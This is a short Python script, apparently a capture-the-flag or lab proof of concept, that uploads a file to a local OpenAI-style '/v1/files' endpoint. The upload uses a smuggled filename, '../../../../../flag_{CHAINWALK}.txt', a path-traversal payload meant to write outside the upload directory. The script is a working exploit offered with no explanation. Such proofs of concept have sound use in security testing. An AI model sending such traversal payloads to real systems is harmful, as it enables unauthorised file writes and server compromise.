import requests

url = "http://127.0.0.1:7861/v1/files?purpose=assistants"

files = {
    "file": ("../../../../../flag_{CHAINWALK}.txt", "f14033dd62ab7110ed165f4efba5150d", "text/plain")
}

try:
    response = requests.post(url, files=files)
    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.text}")
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
